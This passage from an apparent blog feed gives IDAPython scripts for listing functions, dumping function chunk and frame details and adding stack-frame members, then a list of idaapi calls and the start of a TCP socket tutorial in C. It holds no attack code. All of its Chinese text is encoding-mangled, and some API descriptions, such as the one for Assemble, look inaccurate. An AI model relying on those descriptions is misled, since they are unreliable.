class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># Get current ea</span></span><br><span class="line">    ea = ida_kernwin.get_screen_ea()</span><br><span class="line">    <span class="keyword">if</span> ea == ida_idaapi.BADADDR:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Could not get get_screen_ea()&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    seg = ida_segment.getseg(ea)</span><br><span class="line">    <span class="keyword">if</span> seg:</span><br><span class="line">        <span class="comment"># Loop from start to end in the current segment</span></span><br><span class="line">        <span class="keyword">for</span> funcea <span class="keyword">in</span> idautils.Functions(seg.start_ea, seg.end_ea):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Function %s at 0x%x&quot;</span> % (ida_funcs.get_func_name(funcea), funcea))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find all code references to funcea</span></span><br><span class="line">            <span class="keyword">for</span> ref <span class="keyword">in</span> idautils.CodeRefsTo(funcea, <span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  called from %s(0x%x)&quot;</span> % (ida_funcs.get_func_name(ref), ref))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please position the cursor within a segment&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="è·å–å¹¶æ‰“å°å½“å‰å…‰æ ‡æ‰€åœ¨å‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰çš„è¯¦ç»†ä¿¡æ¯"><a href="#è·å–å¹¶æ‰“å°å½“å‰å…‰æ ‡æ‰€åœ¨å‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰çš„è¯¦ç»†ä¿¡æ¯" class="headerlink" title="è·å–å¹¶æ‰“å°å½“å‰å…‰æ ‡æ‰€åœ¨å‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰çš„è¯¦ç»†ä¿¡æ¯"></a>è·å–å¹¶æ‰“å°å½“å‰å…‰æ ‡æ‰€åœ¨å‡½æ•°ï¼ˆæˆ–ä»£ç å—ï¼‰çš„è¯¦ç»†ä¿¡æ¯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_flags</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°å‡½æ•°çš„æ ‡å¿—ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å‡½æ•°æ ‡å¿—: %08X&quot;</span> % fn.flags)</span><br><span class="line">    <span class="keyword">if</span> fn.is_far():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  è¿œå‡½æ•°&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fn.does_return():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  è¯¥å‡½æ•°ä¸ä¼šè¿”å›&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> fn.flags &amp; ida_funcs.FUNC_FRAME:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  è¯¥å‡½æ•°ä½¿ç”¨å¸§æŒ‡é’ˆ&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> fn.flags &amp; ida_funcs.FUNC_THUNK:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  è¯¥å‡½æ•°æ˜¯ Thunk å‡½æ•°&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> fn.flags &amp; ida_funcs.FUNC_LUMINA:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  è¯¥å‡½æ•°ä¿¡æ¯ç”± Lumina æä¾›&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> fn.flags &amp; ida_funcs.FUNC_OUTLINE:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  è¯¥å‡½æ•°æ˜¯ä¼ªä»£ç å‡½æ•°ï¼ˆéçœŸå®å‡½æ•°ï¼‰&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_regvars</span>(<span class="params">pfn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°å‡½æ•°ä¸­çš„é‡å‘½åå¯„å­˜å™¨ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> ida_funcs.is_func_entry(pfn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯¥å‡½æ•°æœ‰ %d ä¸ªé‡å‘½åå¯„å­˜å™¨&quot;</span> % pfn.regvarqty)</span><br><span class="line">    <span class="keyword">for</span> rv <span class="keyword">in</span> pfn.regvars:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%08X..%08X &#x27;%s&#x27;-&gt;&#x27;%s&#x27;&quot;</span> % (rv.start_ea, rv.end_ea, rv.canon, rv.user))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_regargs</span>(<span class="params">pfn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°å¯„å­˜å™¨ä¼ é€’çš„å‚æ•°ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> ida_funcs.is_func_entry(pfn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯¥å‡½æ•°æœ‰ %d ä¸ªå¯„å­˜å™¨å‚æ•°&quot;</span> % pfn.regargqty)</span><br><span class="line">    <span class="keyword">for</span> ra <span class="keyword">in</span> pfn.regargs:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  å¯„å­˜å™¨ç¼–å·=%d, å‚æ•°åç§°=\&quot;%s\&quot;, (åºåˆ—åŒ–ç±»å‹)=\&quot;%s\&quot;&quot;</span> % (</span><br><span class="line">            ra.reg,</span><br><span class="line">            ra.name,</span><br><span class="line">            binascii.hexlify(ra.<span class="built_in">type</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_tails</span>(<span class="params">pfn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°å‡½æ•°çš„å°¾å—ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> ida_funcs.is_func_entry(pfn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯¥å‡½æ•°æœ‰ %d ä¸ªå°¾å—&quot;</span> % pfn.tailqty)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pfn.tailqty):</span><br><span class="line">        ft = pfn.tails[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  å°¾å— %i: %08X..%08X&quot;</span> % (i, ft.start_ea, ft.end_ea))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_stkpnts</span>(<span class="params">pfn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°å‡½æ•°çš„æ ˆè°ƒæ•´ç‚¹ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯¥å‡½æ•°æœ‰ %d ä¸ªæ ˆè°ƒæ•´ç‚¹&quot;</span> % pfn.pntqty)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pfn.pntqty):</span><br><span class="line">        pnt = pfn.points[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  æ ˆè°ƒæ•´ç‚¹ %i @%08X: %d&quot;</span> % (i, pnt.ea, pnt.spd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_frame</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°å‡½æ•°çš„æ ˆå¸§ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> ida_funcs.is_func_entry(fn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¸§ç»“æ„ ID: %08X&quot;</span> % fn.frame)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å±€éƒ¨å˜é‡åŒºå¤§å°: %8X&quot;</span> % fn.frsize)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ä¿å­˜å¯„å­˜å™¨åŒºå¤§å°: %8X&quot;</span> % fn.frregs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¿”å›æ—¶æ¸…ç†çš„å­—èŠ‚æ•°: %8X&quot;</span> % fn.argsize)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¸§æŒ‡é’ˆåç§»é‡: %8X&quot;</span> % fn.fpd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_parents</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°å‡½æ•°å°¾å—çš„æ‰€æœ‰è€…å’Œå¼•ç”¨ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> ida_funcs.is_func_tail(fn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ‰€å±å‡½æ•°: %08X&quot;</span> % fn.owner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯¥å°¾å—è¢« %d ä¸ªå‡½æ•°å¼•ç”¨&quot;</span> % fn.refqty)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(fn.refqty):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  å¼•ç”¨è€… %i: %08X&quot;</span> % (i, fn.referers[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_func_info</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ‰“å°æŒ‡å®šåœ°å€æ‰€åœ¨çš„å‡½æ•°ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">    pfn = ida_funcs.get_fchunk(ea)</span><br><span class="line">    <span class="keyword">if</span> pfn <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¯¥åœ°å€ %08X å¤„æ²¡æœ‰å‡½æ•°ï¼&quot;</span> % ea)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å½“å‰ä»£ç å—èŒƒå›´: %08X..%08X&quot;</span> % (pfn.start_ea, pfn.end_ea))</span><br><span class="line">    dump_flags(pfn)</span><br><span class="line">    <span class="keyword">if</span> ida_funcs.is_func_entry(pfn):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¿™æ˜¯ä¸€ä¸ªå…¥å£ä»£ç å—&quot;</span>)</span><br><span class="line">        dump_tails(pfn)</span><br><span class="line">        dump_frame(pfn)</span><br><span class="line">        dump_regvars(pfn)</span><br><span class="line">        dump_regargs(pfn)</span><br><span class="line">        dump_stkpnts(pfn)</span><br><span class="line">    <span class="keyword">elif</span> ida_funcs.is_func_tail(pfn):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;è¿™æ˜¯ä¸€ä¸ªå°¾ä»£ç å—&quot;</span>)</span><br><span class="line">        dump_parents(pfn)</span><br><span class="line"></span><br><span class="line">ea = ida_kernwin.get_screen_ea()</span><br><span class="line">dump_func_info(ea)</span><br></pre></td></tr></table></figure><h2 id="å‘ç°æœ‰å‡½æ•°å¸§æ·»åŠ æ–°æˆå‘˜"><a href="#å‘ç°æœ‰å‡½æ•°å¸§æ·»åŠ æ–°æˆå‘˜" class="headerlink" title="å‘ç°æœ‰å‡½æ•°å¸§æ·»åŠ æ–°æˆå‘˜"></a><strong>å‘ç°æœ‰å‡½æ•°å¸§æ·»åŠ æ–°æˆå‘˜</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_frame</span><br><span class="line"><span class="keyword">import</span> ida_typeinf</span><br><span class="line"><span class="keyword">import</span> ida_range</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_frame_member</span>(<span class="params">func_ea</span>):</span><br><span class="line">    name = <span class="string">&quot;my_stkvar&quot;</span></span><br><span class="line"></span><br><span class="line">    tif = ida_typeinf.tinfo_t(ida_typeinf.BTF_UINT64) </span><br><span class="line">    <span class="comment">#åˆ›å»ºäº†ä¸€ä¸ª 64 ä½æ•´æ•° (uint64_t) çš„ tinfo_t ç±»å‹å¯¹è±¡ã€‚</span></span><br><span class="line">    tif.create_ptr(tif)</span><br><span class="line">    <span class="comment"># å°†å…¶è½¬æ¢ä¸ºæŒ‡é’ˆç±»å‹ï¼Œå³ uint64_t*ã€‚</span></span><br><span class="line">    </span><br><span class="line">    func = ida_funcs.get_func(func_ea)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> func:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Failed to get function!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Function @ <span class="subst">&#123;func.start_ea:x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    frame_tif = ida_typeinf.tinfo_t()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ida_frame.get_func_frame(frame_tif, func):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Failed to get frame!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;frame_tif._<span class="built_in">print</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rs = ida_range.rangeset_t()</span><br><span class="line">    sp_offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> frame_tif.calc_gaps(rs):</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">range</span> <span class="keyword">in</span> rs:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">range</span>.start_ea &lt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> (<span class="built_in">range</span>.end_ea - <span class="built_in">range</span>.start_ea) &gt;= tif.get_size():</span><br><span class="line">                sp_offset = <span class="built_in">range</span>.start_ea</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Range [<span class="subst">&#123;<span class="built_in">range</span>.start_ea:x&#125;</span>, <span class="subst">&#123;<span class="built_in">range</span>.end_ea:x&#125;</span>[ selected.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> sp_offset &gt; <span class="number">0</span>:</span><br><span class="line">        sval = ida_frame.calc_frame_offset(func, sp_offset, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment"># è®¡ç®—åœ¨IDA æ ˆå¸§ç»“æ„ä¸­çš„åç§»é‡</span></span><br><span class="line">        <span class="keyword">if</span> ida_frame.add_frame_member(func, name, sval, tif):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Frame member added at frame offset <span class="subst">&#123;sval&#125;</span>!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed adding frame member&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Could not find gaps in current frame...&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_frame_member(idc.here())</span><br></pre></td></tr></table></figure><h1 id="å¸¸ç”¨API"><a href="#å¸¸ç”¨API" class="headerlink" title="å¸¸ç”¨API"></a>å¸¸ç”¨API</h1><p><code>idaapi.MinEA()</code>ï¼šè·å–è½½å…¥ç¨‹åºçš„æœ€å°çš„æœ‰æ•ˆåœ°å€ã€‚</p><p><code>idaapi.MaxEA()</code>ï¼šè·å–è½½å…¥çš„ç¨‹åºæœ€å¤§çš„æœ‰æ•ˆåœ°å€ã€‚</p><p><code>idaapi.Assemble(head, line)</code>ï¼šä»headåœ°å€å¼€å§‹åæ±‡ç¼–ï¼Œå¯»æ‰¾ç›´åˆ°é‡åˆ°lineè¿™æ¡æŒ‡ä»¤æ—¶åœæ­¢ï¼Œè¿”å›ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªè¡¨ç¤ºæ˜¯å¦æˆåŠŸï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æœ€åè¿™æ¡lineæŒ‡ä»¤çš„å­—èŠ‚è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼š<code>ret</code>å°±ä¼šæ˜¯<code>&#39;\xc3&#39;</code>è¿™ä¸€ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œæœ‰äº›æŒ‡ä»¤å¯èƒ½ç”±å¤šä¸ªå­—èŠ‚è¡¨ç¤ºã€‚</p><p><code>idaapi.GetMnem(addr)</code>ï¼šè·å–addråœ°å€å¤„çš„æŒ‡ä»¤ã€‚</p><p><code>idaapi.MakeCode(addr)</code>ï¼šä»addråœ°å€å¼€å§‹å°è¯•å°†æ•°æ®è½¬æ¢ä¸ºæ±‡ç¼–ä»£ç ã€‚</p><p><code>idaapi.next_not_tail(addr)</code>ï¼šå¾€ä¸‹èµ°ä¸€ä¸ªæŒ‡ä»¤ï¼Œå¦‚æœä¸æ˜¯å°¾éƒ¨ï¼Œåˆ™è¿”å›ä¸‹ä¸€æ¡æŒ‡ä»¤çš„èµ·å§‹åœ°å€ã€‚</p><p><code>idaapi.GetDisasm(addr)</code>ï¼šè·å–addråœ°å€å¼€å§‹çš„ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤ã€‚</p><p><code>idaapi.GetFlags(addr)</code>ï¼šè·å–addråœ°å€å¤„çš„ä¸€ç³»åˆ—æ ‡å¿—ä½ï¼Œå¯ç”¨æ¥<em>åˆ¤æ–­å±äºcodeè¿˜æ˜¯data</em>ã€‚</p><p><code>idaapi.isCode(Flags)</code>ï¼šé€šè¿‡Flagsåˆ¤æ–­æ˜¯å¦æ˜¯æ±‡ç¼–ä»£ç ã€‚</p><p><code>idaapi.MakeUnkn(addr, size)</code>ï¼šå–æ¶ˆå¯¹addråœ°å€å¤„çš„sizeå¤§å°çš„å®šä¹‰ï¼Œæš‚ä¸æ¸…æ¥šè¯¥åœ°å€æ˜¯ä»£ç è¿˜æ˜¯æ•°æ®æ—¶å¯ä»¥ä½¿ç”¨ã€‚</p><p><code>idaapi.GetOpnd(addr, index)</code>ï¼šå–addråœ°å€å¤„çš„æŒ‡ä»¤çš„ç¬¬indexä¸ªæ“ä½œæ•°ï¼Œä»é›¶å¼€å§‹ï¼Œä»å·¦å¼€å§‹ï¼Œä¾æ¬¡ä¸ºintelæ±‡ç¼–è¯­æ³•ä¸­çš„ç›®çš„æ“ä½œæ•°ã€æºæ“ä½œæ•°ã€‚</p><p><code>idaapi.get_name_ea(min_ea, name)</code>ï¼šä»min_eaåœ°å€å¼€å§‹ï¼Œå¯»æ‰¾åä¸ºnameçš„æœ‰æ•ˆåœ°å€ï¼Œè¯¥nameå¯ä»¥ä¸ºå‡½æ•°åã€labelåã€‚</p><p><code>idaapi.get_dword(addr)</code>ï¼šä»addråœ°å€å¤„è·å–ä¸€ä¸ªdwordæ•°æ®ã€‚</p><p><code>idaapi.MakeDword(addr)</code>ï¼šå°†addrå¼€å§‹çš„ä¸€ä¸ªDWORDå¤§å°çš„æ•°æ®å®šä¹‰ä¸ºåŒå­—å½¢å¼ï¼Œä¸¾ä¸€åä¸‰ï¼ŒQä»£è¡¨å››å­—èŠ‚æ•°æ®ï¼ŒAPIå½¢å¼ä¸€è‡´ã€‚</p><p><code>idaapi.Segname(addr)</code>ï¼šå¾—åˆ°addråœ°å€æ‰€å¤„çš„åŒºæ®µåã€‚</p><p><code>idaapi.MakeFunction(addr)</code>ï¼šå°†addråœ°å€å¤„å®šä¹‰ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œç›¸å½“äºå¿«æ·é”®Pã€‚</p><p>BADADDR: å¸¸é‡ï¼Œä»£è¡¨é”™è¯¯çš„åœ°å€ã€‚</p><p><code>idaapi.GetSpd(addr)</code>ï¼šè·å–addråœ°å€å¤„çš„æ ˆæŒ‡é’ˆSPçš„å€¼ï¼Œè€Œåœ¨IDAä¸­æ˜¾ç¤ºçš„å€¼åˆ™æ˜¯SPåˆ°BPåŸºå€é’ˆçš„å·®å€¼ï¼Œä¾‹å¦‚è·å–åˆ°çš„å€¼ä¸º-4ï¼Œåœ¨IDAä¸­æ˜¾ç¤ºæ ˆæŒ‡é’ˆçš„æƒ…å†µæ—¶åˆ™ä¸º4ã€‚</p><p><code>idaapi.SetSpDiff(addr, diff)</code>ï¼šè®¾ç½®addråœ°å€å¤„çš„SpæŒ‡é’ˆä¸BpæŒ‡é’ˆçš„å·®å€¼ï¼Œåœ¨å¹³è¡¡å †æ ˆæ—¶éœ€è¦ç”¨åˆ°ã€‚</p><p><code>idaapi.next_head(head, BADADDR)</code>ï¼šéå†ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œé™¤éé‡åˆ°BADADDRï¼Œè¿”å›ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p><p><code>idaapi.ua_mnem(addr)</code>ï¼šè¿”å›addråœ°å€å¤„çš„æŒ‡ä»¤ç±»å‹ã€‚</p><p><code>idaapi.MakeName(addr, &#39;&#39;)</code>ï¼šç»™addråœ°å€å¤„ä¸€ä¸ªæ ‡è®°labelã€‚</p><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDA, Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯†TCP</title>
      <link href="/2024/12/27/%E5%88%9D%E8%AF%86TCP/"/>
      <url>/2024/12/27/%E5%88%9D%E8%AF%86TCP/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><h3 id="ä¸€ã€TCPç‰¹ç‚¹"><a href="#ä¸€ã€TCPç‰¹ç‚¹" class="headerlink" title="ä¸€ã€TCPç‰¹ç‚¹"></a>ä¸€ã€TCPç‰¹ç‚¹</h3><ol><li><p>é¢å‘è¿æ¥çš„åè®®ï¼Œåœ¨ä¼ è¾“æ•°æ®å‰éœ€è¦å»ºç«‹ä¸€æ¡å¯é è¿æ¥</p></li><li><p>æµå¼åè®®ï¼ŒTCPå°†æ•°æ®çœ‹ä½œå­—èŠ‚æµã€‚ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®æ˜¯å¯ä»¥è¢«åˆ†å‰²ä¸ºå¤šä¸ªæ•°æ®åŒ…åœ¨æ¥æ”¶ç«¯é‡æ–°ç»„è£…çš„ã€‚</p></li><li><p>TCPé€šè¿‡æ ¡éªŒå’Œ\åºåˆ—å·å’Œç¡®è®¤åº”ç­”æ¥ç¡®ä¿æ•°æ®çš„å¯é ä¼ è¾“ï¼Œå‡ºé”™å›é‡æ–°ä¼ è¾“ã€‚</p></li><li><p>æœåŠ¡å™¨è¢«åŠ¨è¿æ¥ï¼Œå®¢æˆ·ç«¯ä¸»åŠ¨è¿æ¥ã€‚</p></li></ol><h3 id="äºŒã€TCPç¼–ç¨‹"><a href="#äºŒã€TCPç¼–ç¨‹" class="headerlink" title="äºŒã€TCPç¼–ç¨‹"></a>äºŒã€TCPç¼–ç¨‹</h3><h4 id="serverç«¯"><a href="#serverç«¯" class="headerlink" title="serverç«¯"></a>serverç«¯</h4><h5 id="1-åˆ›å»ºå¥—æ¥å­—socket"><a href="#1-åˆ›å»ºå¥—æ¥å­—socket" class="headerlink" title="1.åˆ›å»ºå¥—æ¥å­—socket()"></a>1.åˆ›å»ºå¥—æ¥å­—socket()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br><span class="line"> </span><br><span class="line">åŠŸèƒ½ï¼š</span><br><span class="line">    åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">å‚æ•°ï¼š</span><br><span class="line">    